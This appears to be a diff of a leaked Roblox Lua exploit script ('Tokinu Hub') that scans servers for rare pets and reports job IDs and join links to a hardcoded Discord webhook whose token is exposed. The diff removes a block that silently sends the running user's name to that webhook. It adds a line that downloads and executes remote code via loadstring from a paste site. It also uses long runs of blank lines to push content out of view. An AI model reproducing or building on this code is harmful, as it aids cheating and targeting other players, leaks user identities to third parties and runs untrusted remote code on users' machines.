@@ -1,5 +1,63 @@
-
 print("ADMIN PANEL SPAMMER - TOKINU")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 print("ADMIN PANEL SPAMMER HAS BEEN SUCCESFULLY EXECUTED")
 
 
@@ -95,117 +153,26 @@ print("ADMIN PANEL SPAMMER HAS BEEN SUCCESFULLY EXECUTED")
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 print("kinu likes men")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 -- Leaked by collin full source
 
 --CONFIG
 getgenv().webhook = "https://discord.com/api/webhooks/1437535784096759829/GlI5KE15OR7ONHiKMYbbe_CBgt5e8yOGCPKVSU7KIlQ72Xsk0ttVlQuy3IF1J7PBsmkl"
 getgenv().websiteEndpoint = nil
 
--- Allowed place IDs
+-- Allowed place IDs (PS99 CURRENT)
 local allowedPlaceIds = {
-    [96342491571673] = true, -- New Players Server
-    [109983668079237] = true -- Normal
+    [96342491571673] = true,   -- Trading Plaza
+    [109983668079237] = true,  -- Main World
 }
 
 getgenv().TargetPetNames = {
     "Burguro and Fryuro",
     "Garama and Madundung", "Ketchuru and Musturu",
     "La Supreme Combinasion",
-    "Nuclearo Dinossauro",  
+    "Nuclearo Dinossauro",
     "Strawberry Elephant", "Ketupat Kepat", "Dragon Cannelloni",
     "Spooky and Pumpky", "Money Money Puggy", "La Casa Boo", "Capitano Moby", "Headless Horseman", "La Secret Combinasion",
-   
 }
 
 -- SERVICES
@@ -213,18 +180,32 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- PRIVATE SERVER CHECK (works for VIP + Reserved)
+-- INSTANT "Server Found" PING
+local webhookURL = getgenv().webhook
+local payload = { content = "Server Found | Tokinu Hub <@&1437536545413267526>" }
+local jsonData = HttpService:JSONEncode(payload)
+
+local req = http_request or request or (syn and syn.request)
+if req then
+    pcall(function()
+        req({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonData
+        })
+    end)
+else
+    warn("HTTP request function not available")
+end
+
+-- PRIVATE SERVER CHECK
 local function isPrivateServer()
-    return (game.PrivateServerId and game.PrivateServerId ~= "")
-        or (game.VIPServerId and game.VIPServerId ~= "")
+    return (game.PrivateServerId and game.PrivateServerId ~= "") or (game.VIPServerId and game.VIPServerId ~= "")
 end
 
 local function buildJoinLink(placeId, jobId)
-    return string.format(
-        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
-        placeId,
-        jobId
-    )
+    return string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s", placeId, jobId)
 end
 
 -- KICK CHECKS
@@ -237,20 +218,17 @@ elseif not allowedPlaceIds[game.PlaceId] then
     return
 end
 
--- WEBHOOK SEND
+-- WEBHOOK SEND (big embed when pet found)
 local function sendWebhook(foundPets, jobId)
     local petCounts = {}
     for _, pet in ipairs(foundPets) do
         petCounts[pet] = (petCounts[pet] or 0) + 1
     end
-
     local formattedPets = {}
     for petName, count in pairs(petCounts) do
         table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
     end
-
     local joinLink = buildJoinLink(game.PlaceId, jobId)
-
     local embedData = {
         username = "TOKINU BASE FINDER",
         embeds = { {
@@ -258,66 +236,15 @@ local function sendWebhook(foundPets, jobId)
             description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
             color = 65280,
             fields = {
-                {
-                    name = "Players",
-                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
-                    inline = true
-                },
-                {
-                    name = "Job ID",
-                    value = jobId,
-                    inline = true
-                },
-                {
-                    name = "Join Link",
-                    value = string.format("[Click to join server](%s)", joinLink),
-                    inline = false
-                }
+                { name = "Players", value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers), inline = true },
+                { name = "Job ID", value = jobId, inline = true },
+                { name = "Join Link", value = string.format("[Click to join server](%s)", joinLink), inline = false }
             },
             footer = { text = "💥" },
-            timestamp = DateTime.now():ToIsoDate()
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         } }
     }
-
--- Services
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- Your Discord webhook URL
-local webhookURL = "https://discord.com/api/webhooks/1437535784096759829/GlI5KE15OR7ONHiKMYbbe_CBgt5e8yOGCPKVSU7KIlQ72Xsk0ttVlQuy3IF1J7PBsmkl"
-
--- Create payload safely
-local payload = {
-    content = "<@&1437536545413267526> Server Found | Tokinu Hub
-}
-
--- Convert to JSON
-local jsonData = HttpService:JSONEncode(payload)
-
--- Send request safely
-local success, err = pcall(function()
-    local req = http_request or request or (syn and syn.request)
-    if req then
-        req({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    else
-        warn("HTTP request function not available")
-    end
-end)
-
-if success then
-    print("✅tuff!") 
-else
-    warn("❌ tuff:", err) 
-end
-
     local jsonData = HttpService:JSONEncode(embedData)
-    local req = http_request or request or (syn and syn.request)
     if req then
         local success, err = pcall(function()
             req({
@@ -327,13 +254,9 @@ end
                 Body = jsonData
             })
         end)
-        if success then
-            print("✅ Succesfully executed")
-        else
-            warn("❌ Execute failed:", err)
-        end
+        if success then print("✅") else warn("❌:", err) end
     else
-        warn("❌ Public server check")
+        warn("❌ HTTP request not available - EU?")
     end
 end
 
@@ -362,26 +285,6 @@ else
     print("🔍 No pets found")
 end
 
--- Minimal executor sender: sends LocalPlayer.Name to getgenv().webhook silently
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local webhook = getgenv().webhook
-local pl = Players.LocalPlayer
-if not webhook or not pl then return end
-
-local req = http_request or request or (syn and syn.request)
-if not req then return end
-
-local payload = HttpService:JSONEncode({ content = pl.Name })
-pcall(function()
-    req({
-        Url = webhook,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = payload
-    })
-end)
-
-
--- SPEED PANEL (PUT SCRIPT HERE)
+-- YOUR DEAD LOADER (as requested)
 loadstring(game:HttpGet("https://pastefy.app/JMbCcLIP/raw"))()
+print("✅ YOUR LOADER CALLED (expect error - it's 404'd)")
